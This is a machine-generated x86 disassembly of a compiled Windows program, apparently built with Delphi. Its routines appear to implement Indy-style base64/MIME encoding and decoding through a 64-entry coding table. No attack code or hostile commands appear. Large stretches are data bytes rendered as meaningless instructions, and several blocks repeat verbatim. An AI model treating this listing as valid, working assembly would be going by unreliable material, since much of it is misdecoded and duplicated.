imul esi [ ebx + 0x74 ] 0x9258c08b
inc edi
arpl [ edi + 0x64 ] bp
jb r-xdata
imul esi [ ebx + 0x73 ] 0x436e6f69
outsd
mov eax eax
add [ edi + edx + 0x42 ] bl
add [ eax - 0x7ffb86a ] cl
clc
inc esi
add [ eax ] dh
stc
inc esi
add [ eax - 0x7 ] ah
inc esi
add [ eax + 0x29 ] cl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x680040 ] dl
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
dec ebp
jae r-xdata
adc al 0x42
xchg edx eax
inc edi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
dec ebp
jae r-xdata
or [ ecx ] dh
inc eax
add ah bh
xchg ebp eax
inc edi
add [ 0x4d644954 ] dl
jae r-xdata
outsb
outsw
mov eax eax
hlt
mov [ ebx + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
xchg ebx eax
inc edi
add [ eax ] cl
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
mov eax [ esi + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403154
inc edi
dec ebp
jne r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
jb r-xdata
push eax
xchg edx eax
inc edi
add al cl
test [ esi ] 0x5
add [ esi ] cl
dec ecx
dec ebp
jae r-xdata
lea eax [ esi + 0x4 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
push ebp
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
imul esi [ ebx + 0x74 ] 0x5653c08b
test dl dl
je r-xdata
add [ eax ] al
add [ eax - 0x7bffbff0 ] dh
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004793 ] dl
popad
inc ebx
outsd
jb r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
inc ebp
xor edi edi
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
adc [ eax ] al
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46080003 ] al
imul ebp [ ebp + 0x6e ] 0x3c656d61
adc [ eax ] al
insb
add [ eax ] al
[ eax + eax ]
add [ eax + edx + 0x680040 ] dl
add bh bh
push 0x1ff0000
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4791ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_479249
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax - 0x6fffb909 ] dh
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ eax ] al
add [ eax + 0x500e0004 ] al
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
arpl [ edi + 0x64 ] bp
jb r-xdata
imul esi [ ebx + 0x73 ] 0x436e6f69
outsd
mov eax eax
add [ edi + edx + 0x42 ] bl
add [ eax - 0x7ffb86a ] cl
clc
inc esi
add [ eax ] dh
stc
inc esi
add [ eax - 0x7 ] ah
inc esi
add [ eax + 0x29 ] cl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x680040 ] dl
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
dec ebp
jae r-xdata
adc al 0x42
xchg edx eax
inc edi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
dec ebp
jae r-xdata
or [ ecx ] dh
inc eax
add ah bh
xchg ebp eax
inc edi
add [ 0x4d644954 ] dl
jae r-xdata
outsb
outsw
mov eax eax
hlt
mov [ ebx + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
xchg ebx eax
inc edi
add [ eax ] cl
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
mov eax [ esi + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403154
inc edi
dec ebp
jne r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
jb r-xdata
push eax
xchg edx eax
inc edi
add al cl
test [ esi ] 0x5
add [ esi ] cl
dec ecx
dec ebp
jae r-xdata
lea eax [ esi + 0x4 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
push ebp
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
imul esi [ ebx + 0x74 ] 0x5653c08b
test dl dl
je r-xdata
add [ eax ] al
add [ eax - 0x7bffbff0 ] dh
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004793 ] dl
popad
inc ebx
outsd
jb r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
inc ebp
xor edi edi
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
adc [ eax ] al
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46080003 ] al
imul ebp [ ebp + 0x6e ] 0x3c656d61
adc [ eax ] al
insb
add [ eax ] al
[ eax + eax ]
add [ eax + edx + 0x680040 ] dl
add bh bh
push 0x1ff0000
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4793ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_4793e5
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add ah bh
xchg ebp eax
inc edi
add [ 0x4d644954 ] dl
jae r-xdata
mov eax [ esi + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403154
inc edi
dec ebp
jne r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
lea eax [ esi + 0x4 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
push ebp
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
imul esi [ ebx + 0x74 ] 0x5653c08b
test dl dl
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
inc ebp
xor edi edi
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47940c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_479450
push ebx
push esi
push edi
push ebp
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
lea eax [ esi + 0x4 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
mov eax [ esi + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403154
inc edi
dec ebp
jne r-xdata
sub_4794a8
push ebx
push esi
mov esi ecx
mov ebx edx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov ecx esi
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_47940c
mov [ rw-data ] eax
sub_4794fc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46f718
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x6c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_479540
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
lea eax [ esi + 0x6c ]
call sub_40d130
lea eax [ esi + 0x74 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46f7b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_4795b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4795fc
push ebx
push esi
push edi
push ebp
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
lea eax [ esi + 0x4 ]
call sub_40d130
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
mov eax [ esi + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403154
inc edi
dec ebp
jne r-xdata
sub_479654
push ebx
push esi
mov esi ecx
mov ebx edx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov ecx esi
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4795b8
mov [ rw-data ] eax
sub_479688
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46f718
mov [ esi + 0x6c ] 0x294
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4796c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4796ff
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479706
retn
mov eax rw-data
call sub_40d130
mov eax rw-data
call sub_40d130
sub_4798e5
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] bl
adc [ edx ] al
nop
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add ah cl
cmovb eax [ eax ]
aam 0x9c
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
push cs
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
adc [ eax ] al
xor [ eax ] al
je r-xdata
add [ eax ] dl
0x47 0x0
add [ eax ] al
add [ eax ] cl
inc esi
imul ebp [ esp + ebp * 2 + 0x43 ] 0x8d726168
inc eax
xor al 0x8d
inc eax
add [ eax - 0x67 ] dl
inc edi
add [ edi ] al
push cs
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add al [ eax ]
or eax [ ebx + 0x6f ]
imul ebp [ fs : esi + 0x67 ] 0x6c626154
sub [ gs : eax ] dl
inc eax
add [ eax + eax ] dh
add bh bh
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
0x47 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xf4
cwde
inc edi
add [ edi + edx * 4 + 0x40047 ] bl
or ecx [ ecx + 0x64 ]
inc ebx
outsd
jb r-xdata
xor al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
or [ esi + 0x69 ] al
insb
insb
inc ebx
push 0x408d7261
je r-xdata
inc esp
0xb00047 0x0
rcl [ edi + 0x173c0047 ] 0x42
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x2
add [ eax + edx + 0x300040 ] dl
sub_479a01
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] bl
adc [ edx ] al
nop
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add ah cl
cmovb eax [ eax ]
in al 0x9a
inc edi
add [ esi ] cl
push esp
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
scasd [ edi ]
add [ eax ] al
[ edi + 0x1ff0000 ]
je r-xdata
rol [ ebp - 0x47e5812e ] 0x1
add [ eax ] eax
add [ eax ] al
xor edx [ eax + r-xdata ]
pop es
push cs
push esp
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
xor ecx ecx
mov cl [ ebx + eax - 0x1 ]
lea ecx [ esi + ecx - 0x1 ]
push ecx
pop edi
pop esi
pop ebx
retn
add [ eax ] cl
inc esi
imul ebp [ esp + ebp * 2 + 0x43 ] 0x90726168
je r-xdata
mov ecx eax
dec ecx
pop edi
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
xor edx [ eax ]
0x984c0047 0x47
add eax [ eax ]
or ecx [ ecx + 0x64 ]
inc ebx
outsd
jb r-xdata
add [ eax ] al
mov edx esi
je r-xdata
mov [ edx ] 0xff
inc edx
dec eax
jne r-xdata
mov eax ebx
call sub_404210
mov edx eax
test edx edx
jle r-xdata
add [ edx ] ch
xor al 0x1
add [ eax ] ch
adc [ eax ] al
mov eax 0x1
push 0x0
dec ecx
jne r-xdata
push 0x0
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_479c63
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404210
and eax 0x80000003
jns r-xdata
test eax eax
jle r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ ebp - 0x18 ]
call sub_403f50
mov eax [ ebp - 0x4 ]
call sub_404210
mov edi eax
mov ebx 0x1
lea eax [ ebp - 0x10 ]
call sub_403f50
cmp edi ebx
jl r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_40441c
lea eax [ eax + ebx - 0x1 ]
lea edx [ ebp - 0x14 ]
mov ecx 0x4
call sub_4028d8
add ebx 0x4
lea eax [ ebp - 0xa ]
push eax
lea eax [ ebp - 0x9 ]
push eax
lea ecx [ ebp - 0xb ]
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_479c74
mov dl [ ebp - 0x12 ]
mov al [ esi + 0xaf ]
cmp dl al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479c6a
lea eax [ ebp - 0x28 ]
mov edx 0x5
call sub_403f74
lea eax [ ebp - 0x10 ]
call sub_403f50
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax [ ebp - 0x10 ]
call sub_404210
push eax
lea eax [ ebp - 0x10 ]
call j_sub_40441c
mov edx eax
mov eax [ ebp - 0x8 ]
pop ecx
call sub_41ad28
mov dl [ ebp - 0x11 ]
cmp al dl
jne r-xdata
lea eax [ ebp - 0x20 ]
mov dl [ ebp - 0xb ]
call sub_404138
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_404218
jmp r-xdata
lea eax [ ebp - 0x28 ]
lea edx [ ebp - 0xb ]
mov ecx 0x3
call sub_404040
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0x10 ]
call sub_404218
lea eax [ ebp - 0x24 ]
lea edx [ ebp - 0xb ]
mov ecx 0x2
call sub_404040
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_404218
jmp r-xdata
cmp edi ebx
jge r-xdata
sub_479aa4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov eax 0x7f
mov edx esi
mov [ edx ] 0xff
inc edx
dec eax
jne r-xdata
mov eax ebx
call sub_404210
mov edx eax
test edx edx
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax 0x1
xor ecx ecx
mov cl [ ebx + eax - 0x1 ]
lea ecx [ esi + ecx - 0x1 ]
push ecx
mov ecx eax
dec ecx
pop edi
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
sub_479ae4
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_479c63
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404210
and eax 0x80000003
jns r-xdata
test eax eax
jle r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ ebp - 0x18 ]
call sub_403f50
mov eax [ ebp - 0x4 ]
call sub_404210
mov edi eax
mov ebx 0x1
lea eax [ ebp - 0x10 ]
call sub_403f50
cmp edi ebx
jl r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_40441c
lea eax [ eax + ebx - 0x1 ]
lea edx [ ebp - 0x14 ]
mov ecx 0x4
call sub_4028d8
add ebx 0x4
lea eax [ ebp - 0xa ]
push eax
lea eax [ ebp - 0x9 ]
push eax
lea ecx [ ebp - 0xb ]
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_479c74
mov dl [ ebp - 0x12 ]
mov al [ esi + 0xaf ]
cmp dl al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479c6a
lea eax [ ebp - 0x28 ]
mov edx 0x5
call sub_403f74
lea eax [ ebp - 0x10 ]
call sub_403f50
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax [ ebp - 0x10 ]
call sub_404210
push eax
lea eax [ ebp - 0x10 ]
call j_sub_40441c
mov edx eax
mov eax [ ebp - 0x8 ]
pop ecx
call sub_41ad28
mov dl [ ebp - 0x11 ]
cmp al dl
jne r-xdata
lea eax [ ebp - 0x20 ]
mov dl [ ebp - 0xb ]
call sub_404138
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_404218
jmp r-xdata
lea eax [ ebp - 0x28 ]
lea edx [ ebp - 0xb ]
mov ecx 0x3
call sub_404040
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0x10 ]
call sub_404218
lea eax [ ebp - 0x24 ]
lea edx [ ebp - 0xb ]
mov ecx 0x2
call sub_404040
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_404218
jmp r-xdata
cmp edi ebx
jge r-xdata
sub_479c74
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
xor edx edx
mov dl [ ebp - 0x4 ]
movzx edx [ eax + edx + 0x2f ]
shl edx 0x12
xor ebx ebx
mov bl [ ebp - 0x3 ]
movzx ebx [ eax + ebx + 0x2f ]
shl ebx 0xc
or edx ebx
xor ebx ebx
mov bl [ ebp - 0x2 ]
movzx ebx [ eax + ebx + 0x2f ]
shl ebx 0x6
or edx ebx
xor ebx ebx
mov bl [ ebp - 0x1 ]
movzx eax [ eax + ebx + 0x2f ]
or edx eax
mov [ ebp - 0x4 ] edx
mov al [ ebp - 0x2 ]
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov dl [ ebp - 0x3 ]
mov [ eax ] dl
mov eax [ ebp + 0x8 ]
mov dl [ ebp - 0x4 ]
mov [ eax ] dl
pop ebx
pop ecx
pop ebp
retn 0x8
sub_479cd4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_479e69
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
call sub_403f50
mov [ ebp - 0x11 ] 0x0
cmp ebx 0x7fffffff
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax [ ebp - 0x8 ]
call sub_41aac4
sub esi eax
cmp ebx esi
jge r-xdata
mov eax ebx
mov ecx 0x3
cdq
idiv ecx
test edx edx
jle r-xdata
test esi esi
je r-xdata
mov esi ebx
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479e70
lea eax [ ebp - 0x1c ]
call sub_403f50
lea eax [ ebp - 0xc ]
call sub_403f50
retn
lea eax [ esi + 0x2 ]
mov ecx 0x3
cdq
idiv ecx
mov edx eax
shl edx 0x2
mov eax [ ebp + 0x8 ]
call sub_40459c
xor edi edi
lea eax [ ebp - 0xc ]
mov edx esi
call sub_40459c
lea eax [ ebp - 0xc ]
call j_sub_40441c
mov edx eax
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41acf0
mov ebx 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov dl [ eax + ebx - 0x1 ]
inc ebx
cmp esi ebx
jl r-xdata
xor eax eax
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0xc ]
mov al [ eax + ebx - 0x1 ]
inc ebx
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov eax [ ebp + 0x8 ]
call j_sub_40441c
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x34 ]
mov [ eax + edi - 0x1 ] dl
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov cl [ ecx + ebx - 0x1 ]
mov [ ebp - 0x11 ] cl
inc ebx
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
call j_sub_40441c
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x34 ]
mov [ eax + edi - 0x2 ] dl
mov cl [ ebp - 0x11 ]
push ecx
lea ecx [ ebp - 0x18 ]
push ecx
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_479e7c
mov eax [ ebp + 0x8 ]
call j_sub_40441c
lea edx [ eax + edi ]
lea eax [ ebp - 0x18 ]
mov ecx 0x4
call sub_4028d8
add edi 0x4
cmp [ ebp - 0x10 ] 0x3
jge r-xdata
sub_479e7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi eax
mov eax [ ebp + 0xc ]
xor ebx ebx
mov bl dl
shr ebx 0x2
and ebx 0x3f
mov edi [ esi + 0x30 ]
mov bl [ edi + ebx ]
mov [ ebp - 0x4 ] bl
and edx 0xff
shl edx 0x4
xor ebx ebx
mov bl cl
shr ebx 0x4
or edx ebx
and edx 0x3f
mov ebx [ esi + 0x30 ]
mov dl [ ebx + edx ]
mov [ ebp - 0x3 ] dl
xor edx edx
mov dl cl
shl edx 0x2
xor ecx ecx
mov cl al
shr ecx 0x6
or edx ecx
and edx 0x3f
mov ecx [ esi + 0x30 ]
mov dl [ ecx + edx ]
mov [ ebp - 0x2 ] dl
and al 0x3f
and eax 0xff
mov edx [ esi + 0x30 ]
mov al [ edx + eax ]
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_479ef8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_479f1d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479f24
retn
sub_479f6d
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] bl
adc [ edx ] al
nop
mov [ ecx ] es
inc esp
add [ eax ] al
add [ eax + 0x47 ] ch
add [ eax - 0x3c000000 ] dh
cdq
inc edi
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
dec ecx
dec ebp
inc ebp
nop
les ebx [ edi + 0xe070047 ]
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
xor eax [ eax ]
inc eax
add [ eax - 0x67ffbdf0 ] dl
dec ecx
dec ebp
inc ebp
jl r-xdata
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax - 0x5f ] cl
inc edi
add ah dl
pushfd
inc edi
add [ esi ] cl
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
xor [ eax ] eax
sbb [ eax ] dl
inc edx
add [ eax + 0x4400418c ] dl
inc edi
add [ ecx + ebx * 4 + 0x47 ] cl
add [ eax + eax ] al
or ecx [ ecx + 0x64 ]
inc ebx
outsd
jb r-xdata
sbb [ eax ] dl
inc edx
add [ eax + 0x4400418c ] dl
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
